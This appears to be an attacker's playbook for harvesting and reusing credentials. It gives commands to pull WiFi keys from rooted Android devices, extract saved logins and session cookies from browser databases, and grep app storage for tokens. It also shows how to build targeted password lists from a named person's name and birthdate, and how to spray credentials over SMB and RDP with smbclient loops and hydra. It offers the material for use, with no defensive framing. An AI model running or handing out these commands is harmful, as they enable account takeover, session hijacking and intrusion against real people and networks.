# Credential Harvesting & Password Reuse

## Overview
Harvest credentials from compromised devices and spray across all network targets. WiFi passwords from IoT devices are the highest-value source - people reuse them everywhere.

## Harvest Sources (by value)

### 1. IoT WiFi Passwords
```bash
# Android TV/device (root)
cat /data/misc/wifi/WifiConfigStore.xml | grep -E "SSID|PreSharedKey"
```

### 2. Browser Saved Passwords & Cookies
```bash
sqlite3 "Login Data" "SELECT origin_url, username_value FROM logins"
sqlite3 Cookies "SELECT host_key, name, value FROM cookies WHERE name LIKE '%session%'"
strings leveldb/*.ldb | grep -iE "user|token|email"
```

### 3. App Tokens & Sessions
```bash
grep -rl "token\|password\|session" /data/data/*/shared_prefs/*.xml
```

### 4. OSINT-Derived Passwords
From social media, accounts, birth dates - generate targeted password lists.

## Password Generation from OSINT
```python
# Given: name="annet", birthdate="15.03.1995"
patterns = [
    "DDMMYYYY", "DD.MM.YYYY", "DDMMYY",
    "nameYYYY", "nameDDMM", "nameYY",
    "NameYYYY!", "NameDDMMYYYY",
    "DDMM", "MMYYYY",
]
# Females: birth dates, names, simple patterns
# Males: sports, games, profanity, l33tspeak
```

## Spray Methodology
```bash
# Impacket SMB
for user in USERLIST; do
  for pw in PASSLIST; do
    smbclient -U "$user%$pw" //TARGET/C$ -c 'exit' 2>/dev/null && echo "HIT: $user:$pw"
  done
done

# Hydra SSH/RDP/HTTP
hydra -L users.txt -P passwords.txt TARGET smb -t 1 -f
hydra -L users.txt -P passwords.txt TARGET rdp -t 1 -f
```

## Credential Reuse Chain
```
WiFi password → Router admin → Windows login → Email → Cloud services
IoT account → Same password on main devices
Browser cookies → Session hijacking without password
```
